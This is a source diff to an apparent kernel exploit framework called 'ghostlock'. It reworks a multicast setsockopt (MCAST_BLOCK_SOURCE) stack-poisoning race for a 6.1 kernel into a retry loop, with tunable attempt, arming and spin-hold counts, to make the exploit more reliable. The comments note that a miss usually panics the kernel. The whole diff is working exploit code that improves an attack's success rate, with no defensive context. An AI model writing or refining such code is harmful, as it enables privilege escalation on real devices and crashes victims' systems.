@@ -15,6 +15,23 @@
 using namespace ghostlock;
 
 namespace ghostlock::route {
+    namespace {
+        /* Poison/walk repetition. The values are the ones this geometry was
+         * measured with on a 6.1 compact-waiter kernel: the arm only starts once
+         * the earlier copies have overwritten each other, and the waiter thread
+         * spins on yield (no syscall) between the copy and the walk so the
+         * poisoned frame survives. A profile may override them through
+         * route.multicast_waiter {attempts, arm_sequence, arm_hold}; 0 keeps the
+         * default. */
+        constexpr int32_t kMulticastMaxAttempts = 128;
+        constexpr int32_t kMulticastArmSequence = 16;
+        constexpr int32_t kMulticastArmHold = 20000;
+
+        int32_t mcast_from_profile(uint32_t value, int32_t fallback) {
+            return value > 0 ? static_cast<int32_t>(value) : fallback;
+        }
+    } // namespace
+
     route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
         (void) request;
         route::RouteStatus status = {.code = ROUTE_RETRYABLE};
@@ -68,26 +85,44 @@ namespace ghostlock::route {
         session::g_exploit_session.race.consumer_success.store(0);
         session::g_exploit_session.race.consumer_stop.store(0);
         session::g_exploit_session.race.route_delay_usec.store(0);
-        errno = 0;
-        int32_t stamp_result =
-                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
+        /* The copy landing on the caller's stack is a race against skb page
+         * recycling, so a single setsockopt is a single lottery ticket: one miss
+         * costs the whole run, because a miss usually panics the kernel.
+         * Re-poison and re-walk instead, arming from the point where the earlier
+         * copies have overwritten each other. */
+        const profile::execution_settings *exec =
+                session::g_exploit_session.profile.execution();
+        const int32_t max_attempts =
+                mcast_from_profile(exec ? exec->mcast_attempts : 0, kMulticastMaxAttempts);
+        const int32_t arm_sequence =
+                mcast_from_profile(exec ? exec->mcast_arm_sequence : 0, kMulticastArmSequence);
+        const int32_t arm_hold =
+                mcast_from_profile(exec ? exec->mcast_arm_hold : 0, kMulticastArmHold);
+        int32_t stamp_result = -1;
+        int32_t stamp_errno = 0;
+        int32_t attempts_used = 0;
+        for (int32_t attempt = 1; attempt <= max_attempts; attempt++) {
+            attempts_used = attempt;
+            errno = 0;
+            stamp_result = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp,
+                                      (socklen_t) sizeof(stamp));
+            stamp_errno = errno;
+            /* The copy lands before the family check, so -EADDRNOTAVAIL still
+             * means the waiter shape is on the stack now. */
+            if (attempt < arm_sequence ||
+                (stamp_result != 0 && stamp_errno != EADDRNOTAVAIL)) {
+                continue;
+            }
+            session::g_exploit_session.race.consumer_go.store(attempt);
+            for (int32_t spin = 0; spin < arm_hold; spin++)
+                __asm__ volatile("yield" ::: "memory");
+            session::g_exploit_session.race.consumer_go.store(0);
+            while (session::g_exploit_session.race.consumer_inflight.load())
+                __asm__ volatile("yield" ::: "memory");
+            if (session::g_exploit_session.race.consumer_success.load() > 0) break;
+        }
         status.step = 61;
-        status.error_number = errno;
-        session::g_exploit_session.race.consumer_go.store(1);
-        for (int32_t spin = 0; spin < 100000000 &&
-                           session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
-            __asm__ volatile (
-
-
-        "yield"
-        ::: "memory");
-        session::g_exploit_session.race.consumer_go.store(0);
-        while (session::g_exploit_session.race.consumer_inflight.load())
-            __asm__ volatile (
-
-
-        "yield"
-        ::: "memory");
+        status.error_number = stamp_errno;
         close(fd);
         status.userspace_clean = 1;
         status.kernel_disarmed = 1;
@@ -99,9 +134,12 @@ namespace ghostlock::route {
         } else {
             status.code = ROUTE_FALLBACK_SAFE;
         }
-        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
+        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d "
+                "attempts=%d calls=%d success=%d\n",
                 status.code, status.userspace_clean, status.kernel_disarmed,
-                status.step, status.error_number);
+                status.step, status.error_number, attempts_used,
+                session::g_exploit_session.race.consumer_calls.load(),
+                session::g_exploit_session.race.consumer_success.load());
         return status;
     }
 
